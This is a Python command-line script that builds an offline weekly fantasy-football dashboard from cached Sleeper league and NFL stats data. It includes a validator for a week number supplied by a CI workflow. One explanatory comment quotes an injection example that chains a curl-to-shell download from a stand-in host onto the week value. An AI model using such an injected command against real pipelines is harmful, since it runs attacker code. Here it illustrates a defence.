"""Render the weekly decision dashboard from the season cache. OFFLINE.

    PYTHONPATH=src python scripts/weekly/dashboard.py            # prints a summary
    PYTHONPATH=src python scripts/weekly/dashboard.py --write    # + HTML/JSON under data/outputs/dashboard/
    PYTHONPATH=src python scripts/weekly/dashboard.py --write --anonymous --no-archive

Reads only what `pull_week.py` and `sleeper_sync.py` cached; never opens a
socket (tests/test_dashboard_cli.py breaks the socket and renders). The
page states the as-of time of every input, lists every degradation before
any number, and ABSTAINS — per row, per section — wherever the inputs
cannot support a number.

The projections are the rule #5 BASELINE and are labelled so on the page.
P(win) is the closed form from gridiron.winprob, labelled UNCALIBRATED.
"""
from __future__ import annotations

import argparse
import os
import re
import sys
from datetime import datetime, timezone
from pathlib import Path

import pandas as pd

from gridiron import ingest as ing
from gridiron.dashboard import build_dashboard
from gridiron.freshness import WeekContext
from gridiron.ids import Crosswalk, sleeper_gsis_overlay
from gridiron.league_config import (MY_SLEEPER_USERNAME, SEASON_YEAR,
                                    SETTINGS_VERIFIED)
from gridiron.livesync import current_snapshot
from gridiron.paths import OUTPUTS, ensure_dirs
from gridiron.scoring import ScoringCoverage, scoring_coverage
from gridiron.usage import player_weeks, weeks_present
from gridiron.sleeper import player_map_status_note

#: Every source this dashboard READS (same rule as report.py: if a value
#: from a source reaches the page, its as-of line is on the page).
#: tests/test_dashboard_cli.py re-derives this from the file's syntax.
SOURCES = ("sleeper_league", "sleeper_players", "injuries", "schedules",
           "weekly_stats", "snap_counts", "crosswalk")

DASHBOARD_DIR = OUTPUTS / "dashboard"

#: A scheduled cloud build may be dispatched for a specific week. The value
#: arrives from `workflow_dispatch`, which means it is whatever text the
#: dispatcher typed — it is INPUT, not configuration. It is read from the
#: environment rather than interpolated into the job's shell command, because
#: `${{ inputs.week }}` pasted into a `run:` block is executed by the shell
#: before Python ever sees it: `3; curl evil.sh | sh` is a valid string in
#: that box. Passing it through the environment makes it a value, and the
#: validation below is what turns a value into a week.
WEEK_ENV = "GRIDIRON_WEEK"

#: Sleeper numbers the regular season 1-18 and runs playoff weeks past it.
#: The ceiling is deliberately loose and the floor is not: week 0 and negative
#: weeks are not weeks, and anything outside the range is refused rather than
#: clamped, because a clamped week renders a confident page about the wrong
#: games.
WEEK_MIN, WEEK_MAX = 1, 22

_ASCII_WEEK = re.compile(r"[0-9]{1,2}")


def week_from_env(raw: str | None) -> int | None:
    """Validate a dispatched week. Returns None when none was given.

    Refuses anything that is not a bare non-negative integer in range. The
    offending text is echoed with `!r` so a log shows exactly what arrived,
    quoted, as the data it is — never re-emitted into a command.
    """
    if raw is None:
        return None
    text = raw.strip()
    if not text:
        return None
    # `str.isdigit()` is true for Arabic-Indic and other non-ASCII digits,
    # which `int()` then happily converts — so a week could arrive spelled in
    # a script nobody typed on purpose. Accept ASCII digits and nothing else.
    if not _ASCII_WEEK.fullmatch(text):
        raise SystemExit(
            f"REFUSING: {WEEK_ENV}={raw!r} is not a week. Expected a plain "
            f"integer between {WEEK_MIN} and {WEEK_MAX}; this value was treated "
            f"as data and no part of it was run or passed on.")
    week = int(text)
    if not (WEEK_MIN <= week <= WEEK_MAX):
        raise SystemExit(
            f"REFUSING: {WEEK_ENV}={raw!r} is outside weeks "
            f"{WEEK_MIN}-{WEEK_MAX}.")
    return week


def kickoffs_for(schedule: pd.DataFrame | None, week: int) -> list[datetime]:
    from gridiron.lineup import kickoff_index

    idx = kickoff_index(schedule, week)
    return sorted(set(idx.kickoffs.values())) if idx else []


def find_owner_id(snapshot: dict, owner: str) -> str | None:
    """The ONE place a human handle is used; it resolves to an id at once."""
    owner = str(owner)
    for u in snapshot.get("users") or []:
        if str(u.get("user_id")) == owner:
            return owner
        if str(u.get("display_name") or "").lower() == owner.lower():
            return str(u.get("user_id"))
    return None


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--season", type=int, default=SEASON_YEAR)
    ap.add_argument("--week", type=int, default=None,
                    help="report week; defaults to Sleeper's current week")
    ap.add_argument("--owner", default=MY_SLEEPER_USERNAME)
    ap.add_argument("--cache-root", type=Path, default=None)
    ap.add_argument("--out-dir", type=Path, default=None,
                    help="where to write the HTML/JSON (default data/outputs/dashboard/)")
    ap.add_argument("--archive-root", type=Path, default=None,
                    help="where decision archives go (default data/ledger/decisions/)")
    ap.add_argument("--write", action="store_true", help="write HTML + JSON")
    ap.add_argument("--no-archive", action="store_true",
                    help="do not write the decision-time archive")
    ap.add_argument("--anonymous", action="store_true",
                    help="omit the league name from the page")
    ap.add_argument("--now", default=None,
                    help="ISO-8601 UTC instant to render AS OF (locks, freshness); "
                         "default: now")
    ap.add_argument("--fail-on-degraded", action="store_true")
    args = ap.parse_args(argv)

    if not SETTINGS_VERIFIED:
        print("REFUSING: league_config.SETTINGS_VERIFIED is False (rule #1).",
              file=sys.stderr)
        return 3

    now = (datetime.fromisoformat(args.now) if args.now else datetime.now(timezone.utc))
    if now.tzinfo is None:
        now = now.replace(tzinfo=timezone.utc)
    directory = ing.season_cache(args.season, args.cache_root)
    manifest = ing.Manifest.load(directory, args.season)
    if not manifest.entries:
        print(f"No ingest manifest at {directory}. Run:\n"
              f"  PYTHONPATH=src python scripts/ingest/pull_week.py", file=sys.stderr)
        return 2
    if manifest.season != args.season:
        print(f"REFUSING: the cache at {directory} is season {manifest.season}, "
              f"not {args.season}.", file=sys.stderr)
        return 2

    snap_path = current_snapshot(directory, manifest)
    snapshot = manifest.read_json("sleeper_league") or {}
    if not snapshot and snap_path is not None:
        import json
        snapshot = json.loads(snap_path.read_text(encoding="utf-8"))
    state = snapshot.get("state") or {}
    state_season = int(state.get("season") or args.season)
    if state_season != args.season:
        print(f"REFUSING: the cached Sleeper snapshot is season {state_season}, "
              f"the requested dashboard is {args.season}.", file=sys.stderr)
        return 2
    dispatched = week_from_env(os.environ.get(WEEK_ENV))
    report_week = int(args.week or dispatched or state.get("week") or 0)
    if report_week < 1:
        print(f"No in-season week to render: Sleeper state is season {state_season}, "
              f"week {state.get('week')!r}. Pass --week for a past week.", file=sys.stderr)
        return 2

    schedule = manifest.read_frame("schedules")
    weekly = manifest.read_frame("weekly_stats")
    snaps = manifest.read_frame("snap_counts")
    injuries = manifest.read_frame("injuries")
    players = manifest.read_json("sleeper_players") or {}

    ctx = WeekContext.build(
        season=state_season, report_week=report_week,
        stats_weeks=weeks_present(weekly) if weekly is not None else (),
        kickoffs=kickoffs_for(schedule, report_week), now=now)
    sources = manifest.freshness_report(SOURCES, now=now, required_week=report_week)

    cross_path = manifest.file("crosswalk")
    crosswalk = Crosswalk.from_csv(cross_path) if cross_path else Crosswalk({}, {})
    if players:
        crosswalk = crosswalk.with_overlay(sleeper_gsis_overlay(players))
    coverage = (scoring_coverage(weekly.columns) if weekly is not None
                else ScoringCoverage())

    weeks = None
    if weekly is not None and len(weekly):
        skill = weekly.loc[weekly["position"].isin(["QB", "RB", "WR", "TE", "K"])]
        weeks = player_weeks(skill, snaps, crosswalk)

    owner_id = find_owner_id(snapshot, args.owner)
    if owner_id is None:
        print(f"Owner {args.owner!r} not found in the cached league users.",
              file=sys.stderr)
        return 2

    dash = build_dashboard(
        context=ctx, sources=sources, snapshot=snapshot, sleeper_players=players,
        crosswalk=crosswalk, weeks=weeks, schedule=schedule, injuries=injuries,
        scoring=coverage, owner_id=owner_id, now=now,
        archive_root=args.archive_root, write_archive_file=not args.no_archive,
        # A player-map budget that needs a person (RECOVERY NEEDED) is said on
        # the page, not only in the pull step's log.
        extra_notes=(player_map_status_note(directory),))

    # Summary to stdout: no player names, so a log of this run exposes nothing.
    print(f"{ctx.headline()} | evidence boundary wk{ctx.evidence_boundary}")
    print("DEGRADED" if dash.degraded else "All inputs current.")
    for n in dash.notes:
        print(f"  - {n}")
    print(f"projected roster rows: {sum(1 for p in dash.roster if p.projected)}/{len(dash.roster)}")
    m = dash.matchup
    if m is None:
        print(f"matchup: {dash.matchup_reason}")
    else:
        pw = "abstained" if m.pwin is None else f"{m.pwin:.0%} (UNCALIBRATED)"
        print(f"matchup vs roster #{m.opponent_roster_id}: {m.my_mean:.1f}±{m.my_sd:.1f} "
              f"vs {m.opp_mean:.1f}±{m.opp_sd:.1f}; P(win) {pw}")
    print(f"start/sit: {dash.plan.abstained or f'current {dash.plan.current_points:.1f}, best legal {dash.plan.best_points:.1f}, {len(dash.plan.alternatives)} alternative(s)'}")
    print(f"upgrades: {dash.board.abstained or f'{len(dash.board.upgrades)} pair(s) from a pool of {dash.board.pool_size}'}")
    print(f"evaluation: {dash.evaluation.verdict()}")
    if dash.archive:
        print(f"archive: {dash.archive}")

    if args.write:
        ensure_dirs()
        out_dir = args.out_dir or DASHBOARD_DIR
        out_dir.mkdir(parents=True, exist_ok=True)
        html = dash.to_html(include_names=not args.anonymous)
        import json
        for stem in (f"week{report_week:02d}_dashboard", "dashboard_latest"):
            (out_dir / f"{stem}.html").write_text(html, encoding="utf-8")
            (out_dir / f"{stem}.json").write_text(
                json.dumps(dash.record(), indent=1, default=str), encoding="utf-8")
            print(f"[dashboard] wrote {out_dir / (stem + '.html')}", file=sys.stderr)

    return 1 if (args.fail_on_degraded and dash.degraded) else 0


if __name__ == "__main__":
    sys.exit(main())
